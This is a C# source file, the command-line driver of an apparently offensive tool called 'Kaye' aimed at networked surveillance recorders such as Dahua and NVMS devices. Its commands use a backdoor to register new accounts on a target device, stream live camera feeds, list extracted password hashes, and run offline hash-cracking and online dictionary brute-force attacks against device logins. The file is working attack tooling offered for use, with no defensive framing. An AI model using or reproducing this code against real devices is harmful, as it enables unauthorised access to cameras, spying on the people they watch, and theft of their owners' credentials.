using System;
using System.IO;
using System.Drawing;
using System.Threading;

using Kaye.Live;
using Kaye.Static;
using Kaye.Profiles;
using Kaye.Exploits;
using Kaye.Arguments;
using Kaye.BruteForce;

namespace Kaye.Commands
{
    public class KayeCommandExecutor
    {
        Kaye Kaye;
        String CurrentFileName;
        String[] CurrentFileLines;

        public KayeCommandExecutor(Kaye Kaye)
        {
            this.Kaye = Kaye;
        }

        public void Start()
        {
            KayeCommand Command = new KayeCommand();

            while (true)
            {
                Console.Write(StaticContent.CommandPrefix);
                Command = KayeCommand.Parse(Console.ReadLine());

                if (Command.Command == KayeCommandType.Commands) ShowCommands();

                if (!Kaye.Scope.InScope(Command.Command)) continue;

                String CommandStr = KayeCommand.CommandTypeToString(Command.Command);

                if (Command.Command == KayeCommandType.Exit) Environment.Exit(0);

                if (Command.Command == KayeCommandType.Export)
                {
                    if (Command.Args.Length != 1) { Console.WriteLine("  Usage: {0} <path>.", CommandStr); continue; }
                    File.WriteAllText(Command.Args[0], Kaye.Log);
                    Console.WriteLine("{0}Exported the log file.", StaticContent.KayePrefix);
                }

                if (Command.Command == KayeCommandType.Reboot)
                {
                    if (Command.Args.Length != 0) { Console.WriteLine("  Usage: {0}.", CommandStr); continue; }
                    // TODO    
                }

                if (Command.Command == KayeCommandType.Register)
                {
                    if (Command.Args.Length != 2) { Console.WriteLine("  Usage: {0} <user> <pass>", CommandStr); continue; }
                    NVMS9000Backdoor Backdoor;
                    if (!NVMS9000Backdoor.TryPerform(Kaye.Args.Target, out Backdoor)) { Console.WriteLine("{0}Device not exploitable!", StaticContent.KayePrefix); continue; }
                    if (!Backdoor.Register(Command.Args[0], Command.Args[1])) { Console.WriteLine("{0}Device not exploitable!", StaticContent.KayePrefix); continue; }
                    Console.WriteLine("{0}Created account {1} with password {2}", StaticContent.KayePrefix, Command.Args[0], Command.Args[1]);
                }

                if (Command.Command == KayeCommandType.Live)
                {
                    Int32 Channel;
                    if (Command.Args.Length != 1 || !Int32.TryParse(Command.Args[0], out Channel)) { Console.WriteLine("  Usage: {0} <channel>", CommandStr); continue; }
                    DahuaLive Live = new DahuaLive(Kaye.Args.Target, Kaye.EScan.SerialNum);
                    Live.SetProfiles(Kaye.EScan.Profiles);
                    if (!Live.ConfigureProfile(Channel)) Console.WriteLine("{0}Unable to start channel {1}!", StaticContent.KayePrefix, Channel);
                    Console.Clear();
                    Thread Display = new Thread(() => {
                        Image Image;
                        while (true)
                        {
                            if (!Live.GetLiveImage(Channel, out Image)) break;
                            ImageTools.DisplayImage((Bitmap)Image, 0, 20);
                        }
                    });
                    Console.WriteLine("Press E to exit...");
                    Display.Start();
                    ConsoleKey Exit = ConsoleKey.NoName;
                    while (Exit != ConsoleKey.E) Exit = Console.ReadKey(true).Key;
                    Display.Abort();
                    Thread.Sleep(200);
                    Console.Clear();
                    for (Int32 i = 0; i < 2 * Console.WindowWidth * Console.WindowHeight; i++) Console.Write("=");
                    Console.Clear();
                }

                if (Command.Command == KayeCommandType.Hash)
                {
                    Console.WriteLine("{0}Stop current mode and enter hash mode...", StaticContent.KayePrefix);
                    String Entered = String.Empty;
                    Console.Write("{0}Y/N> ", StaticContent.KayePrefix);
                    while ((Entered = Console.ReadLine().ToLower()) != "y" && Entered != "n") Console.Write("{0}Y/N> ", StaticContent.KayePrefix);
                    if (Entered == "n") continue;
                    KayeArguments NewArgs = new KayeArguments(Mode.Hash, Kaye.Args.Target, Kaye.HashProfiles, Kaye.SerialNum);
                    Kaye NewKaye = new Kaye(NewArgs);
                    NewKaye.HashProfiles = Kaye.HashProfiles;
                    NewKaye.SerialNum = Kaye.SerialNum;
                    NewKaye.Run();
                    break;
                }

                if (Command.Command == KayeCommandType.List)
                {
                    if (Command.Args.Length != 0) { Console.WriteLine("  Usage: {0}.", CommandStr); continue; }
                    Profile[] Profs = Kaye.Args.TargetHashes;
                    Console.WriteLine("{0}Loaded profiles: ", StaticContent.KayePrefix);
                    for (Int32 i = 0; i < Profs.Length; i++)
                        Console.WriteLine("   {0}. Username: {1}; PWD Hash: {2} ({3})", (i + 1), Profs[i].Username, Profs[i].Hash, Profs[i].Algorithm);
                    Console.Write("\n");
                }

                if (Command.Command == KayeCommandType.CurrentFile)
                {
                    if (Command.Args.Length != 0) { Console.WriteLine("  Usage: {0}.", CommandStr); continue; }
                    if (CurrentFileName == null || CurrentFileLines == null || CurrentFileLines.Length == 0) { Console.WriteLine("{0}No file imported.", StaticContent.KayePrefix); continue; }
                    Console.WriteLine("{0}Current file is {1} ({2} items).", StaticContent.KayePrefix, CurrentFileName, CurrentFileLines.Length);
                    Console.Write("{0}Items: ", StaticContent.KayePrefix);
                    for (Int32 i = 0; i < CurrentFileLines.Length && i < 4; i++) Console.Write("{0}, ", CurrentFileLines[i]);
                    Console.WriteLine("...");
                }

                if (Command.Command == KayeCommandType.Import)
                {
                    if (Command.Args.Length != 1) { Console.WriteLine("  Usage: {0} <path>.", CommandStr); continue; }
                    if (!File.Exists(Command.Args[0])) { Console.WriteLine("{0}File {1} not found.", StaticContent.KayePrefix, Command.Args[0]); continue; }
                    Console.WriteLine("{0}Importing file {1}...", StaticContent.KayePrefix, Command.Args[0]);
                    String[] FileLines = File.ReadAllLines(Command.Args[0]);
                    if (FileLines.Length == 0) { Console.WriteLine("{0}No lines found...", StaticContent.KayePrefix); continue; }
                    Console.WriteLine("{0}Checking lines...", StaticContent.KayePrefix);
                    Boolean TooLong = false;
                    Int32 i;
                    for (i = 0; !TooLong && i < FileLines.Length; i++) TooLong = TooLong || (FileLines[i].Length > 1024);
                    if (TooLong) { Console.WriteLine("{0}Lines {1} is too long.", StaticContent.KayePrefix, (i + 1)); continue; }
                    CurrentFileName = Command.Args[0];
                    CurrentFileLines = FileLines;
                    Console.WriteLine("{0}File {1} imported ({2} items).", StaticContent.KayePrefix, Command.Args[0], FileLines.Length);
                }

                if (Command.Command == KayeCommandType.Dictionary && Kaye.Args.Mode == Mode.Hash)
                {
                    Int32 Index;
                    if (Command.Args.Length != 1 || !Int32.TryParse(Command.Args[0], out Index)) { Console.WriteLine("  Usage: {0} <num>.", CommandStr); continue; }
                    Index--;
                    if (Index < 0 || Index >= Kaye.Args.TargetHashes.Length) { Console.WriteLine("{0}Invalid profile number.", StaticContent.KayePrefix); continue; }
                    if (CurrentFileName == null || CurrentFileLines == null || CurrentFileLines.Length == 0) { Console.WriteLine("{0}No file imported.", StaticContent.KayePrefix); continue; }
                    Dictionary Dictionary = new Dictionary(CurrentFileName, CurrentFileLines);
                    DictionaryAttack Attack = new DictionaryAttack(Dictionary);
                    Attack.OnStatusUpdate += DictionaryAttackStatus;
                    if (Kaye.Args.TargetHashes[Index].Algorithm == HashAlg.DahuaMD5)
                    {
                        Attack.Username = Kaye.Args.TargetHashes[Index].Username;
                        Attack.SerialNumber = Kaye.SerialNum;
                    }
                    String Key = Attack.HashAttack(Kaye.Args.TargetHashes[Index].Hash, Kaye.Args.TargetHashes[Index].Algorithm);
                    if (Key == null) { Console.WriteLine("{0}Key not found!", StaticContent.KayePrefix); continue; }
                    Console.WriteLine("{0}Key found! Username: {1}; Password: {2}.", StaticContent.KayePrefix, Kaye.Args.TargetHashes[Index].Username, Key);
                }

                if (Command.Command == KayeCommandType.Dictionary && Kaye.Args.Mode == Mode.Brute)
                { 
                    if (Kaye.Model == Models.Model.NVMS1000 && Command.Args.Length != 0) { Console.WriteLine("  Usage: {0}.", CommandStr); continue; }
                    if (Kaye.Model != Models.Model.NVMS1000 && Command.Args.Length != 1) { Console.WriteLine("  Usage: {0} <username>.", CommandStr); continue; }
                    if (CurrentFileName == null || CurrentFileLines == null || CurrentFileLines.Length == 0) { Console.WriteLine("{0}No file imported.", StaticContent.KayePrefix); continue; }
                    Dictionary Dictionary = new Dictionary(CurrentFileName, CurrentFileLines);
                    DictionaryAttack Attack = new DictionaryAttack(Dictionary);
                    Attack.OnStatusUpdate += DictionaryAttackStatus;
                    if (Kaye.Model != Models.Model.NVMS1000) Attack.Username = Command.Args[0];
                    String Key = Attack.OnlineAttack(Kaye.Args.Target, Kaye.Model);
                    if (Key == null) { Console.WriteLine("{0}Key not found!", StaticContent.KayePrefix); continue; }
                    Console.WriteLine("{0}Key found! Username: {1}; Password: {2}.", StaticContent.KayePrefix, Command.Args[0], Key);
                }
            }
        }

        private void DictionaryAttackStatus(Int32 Tested, String Item)
        {
            Console.WriteLine("{0}Tested {1} keys. Last key tested: {2}.", StaticContent.KayePrefix, Tested, Item);
        }

        public void ShowCommands()
        {
            Console.WriteLine("{0}Commands: {1}", StaticContent.KayePrefix, Kaye.Scope);
        }
    }
}